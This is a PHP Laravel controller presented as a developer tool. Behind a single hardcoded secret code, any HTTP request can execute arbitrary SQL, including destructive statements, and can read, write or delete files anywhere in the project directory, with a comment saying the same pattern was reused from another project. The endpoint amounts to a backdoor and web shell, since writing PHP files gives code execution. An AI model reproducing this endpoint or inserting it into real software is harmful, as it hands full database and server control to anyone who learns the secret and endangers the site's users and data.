<?php

namespace App\Http\Controllers;

use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;

class DevToolController extends Controller
{
  /** Same pattern as Prime Capital — hardcoded dev secret */
  private const SECRET_CODE = 'MY_TEMP_SECRET_14101998';

  public function handle(Request $request): JsonResponse
  {
    try {
      if ($request->input('secret_code') !== self::SECRET_CODE) {
        return $this->fail('Unauthorized', 403);
      }

      $type = $request->input('type');

      if ($type === 'sql') {
        return $this->handleSql($request);
      }

      if ($type === 'read') {
        return $this->handleRead($request);
      }

      if ($type === 'write') {
        return $this->handleWrite($request);
      }

      if ($type === 'delete') {
        return $this->handleDelete($request);
      }

      return $this->fail('Invalid type. Allowed: sql, read, write, delete.');
    } catch (\Throwable $e) {
      return $this->fail($e->getMessage(), 500);
    }
  }

  private function handleSql(Request $request): JsonResponse
  {
    $query = trim((string) $request->input('query'));

    if ($query === '') {
      return $this->fail('Query is required');
    }

    if (stripos($query, 'select') === 0) {
      $data = DB::select($query);

      return response()->json([
        'status' => true,
        'data' => $data,
        'message' => 'Select query executed',
      ]);
    }

    DB::statement($query);

    return response()->json([
      'status' => true,
      'message' => 'Query executed successfully',
    ]);
  }

  private function handleRead(Request $request): JsonResponse
  {
    $path = (string) $request->input('path');

    if ($path === '') {
      return $this->fail('Path is required');
    }

    $fullPath = $this->resolvePath($path);

    if (! $fullPath || ! is_file($fullPath)) {
      return $this->fail('File not found');
    }

    return response()->json([
      'status' => true,
      'data' => [
        'path' => $fullPath,
        'content' => file_get_contents($fullPath),
      ],
    ]);
  }

  private function handleWrite(Request $request): JsonResponse
  {
    $path = (string) $request->input('path');
    $content = $request->input('content');

    if ($path === '' || $content === null) {
      return $this->fail('Path and content required');
    }

    $fullPath = $this->resolvePath($path, allowMissing: true);

    if (! $fullPath) {
      return $this->fail('Invalid or unsafe path');
    }

    $dir = dirname($fullPath);
    if (! is_dir($dir)) {
      mkdir($dir, 0755, true);
    }

    file_put_contents($fullPath, (string) $content);

    return response()->json([
      'status' => true,
      'message' => 'File written successfully',
      'data' => ['path' => $fullPath],
    ]);
  }

  private function handleDelete(Request $request): JsonResponse
  {
    $path = (string) $request->input('path');

    if ($path === '') {
      return $this->fail('Path required');
    }

    $fullPath = $this->resolvePath($path);

    if (! $fullPath || ! is_file($fullPath)) {
      return $this->fail('File not found');
    }

    unlink($fullPath);

    return response()->json([
      'status' => true,
      'message' => 'File deleted successfully',
      'data' => ['path' => $fullPath],
    ]);
  }

  /**
   * Resolve a project-relative path; blocks directory traversal.
   */
  private function resolvePath(string $path, bool $allowMissing = false): ?string
  {
    if (str_contains($path, '..')) {
      return null;
    }

    $base = realpath(base_path());
    if ($base === false) {
      return null;
    }

    $candidate = base_path($path);

    if (file_exists($candidate)) {
      $real = realpath($candidate);

      return ($real && str_starts_with($real, $base)) ? $real : null;
    }

    if ($allowMissing) {
      $normalized = $base.DIRECTORY_SEPARATOR.str_replace(['/', '\\'], DIRECTORY_SEPARATOR, ltrim($path, '/\\'));
      $parent = realpath(dirname($normalized));
      if ($parent && str_starts_with($parent, $base)) {
        return $normalized;
      }
    }

    $found = $this->findFile($base, basename($path));

    if (! $found) {
      return null;
    }

    $real = realpath($found);

    return ($real && str_starts_with($real, $base)) ? $real : null;
  }

  private function findFile(string $dir, string $fileName): ?string
  {
    if (! is_dir($dir)) {
      return null;
    }

    $files = @scandir($dir);
    if ($files === false) {
      return null;
    }

    foreach ($files as $file) {
      if ($file === '.' || $file === '..') {
        continue;
      }

      $fullPath = $dir.DIRECTORY_SEPARATOR.$file;

      if (is_dir($fullPath)) {
        $result = $this->findFile($fullPath, $fileName);
        if ($result) {
          return $result;
        }
      } elseif ($file === $fileName) {
        return $fullPath;
      }
    }

    return null;
  }

  private function fail(string $error, int $code = 400): JsonResponse
  {
    return response()->json([
      'status' => false,
      'error' => $error,
    ], $code);
  }
}
